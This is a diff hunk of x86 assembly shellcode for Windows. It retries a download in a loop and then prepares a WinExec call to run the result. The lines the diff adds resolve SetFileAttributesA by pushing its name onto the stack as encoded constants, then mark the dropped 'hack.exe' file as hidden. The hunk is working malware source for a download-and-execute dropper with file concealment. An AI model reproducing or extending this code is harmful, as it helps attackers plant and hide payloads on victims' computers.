@@ -163,6 +163,31 @@ push ecx
 jnz download            ; if it fails to download , retry contineusly
 pop edx
 
+; Finding address of SetFileAttributesA()
+xor edx, edx
+mov edx, 0x4173		; As
+push edx
+push 0x65747562		; etub
+push 0x69727474		; irtt
+push 0x41656C69		; Aeli
+push 0x46746553		; FteS
+push esp
+push dword [ebp-0x4]	; $lpProcName -- push base address of kernel32.dll to the stack
+mov eax, [ebp-0x1C]	; PTR to GetProcAddress to EAX
+call eax
+
+; Call SetFileAttributesA("hack.exe", FILE_ATTRIBUTE_HIDDEN)
+xor ecx, ecx
+push ecx
+push 0x6578652E         ; exe.
+push 0x6B636168         ; kcah
+mov ebx, esp
+xor edx, edx
+add edx, 2 		; FILE_ATTRIBUTE_HIDDEN
+push edx
+push ebx
+call eax
+
 ; Create string 'WinExec\x00' on the stack and save its address to the stack-frame
 mov edx, 0x63657878     ; "cexx"
 shr edx, 8              ; Shifts edx register to the right 8 bits
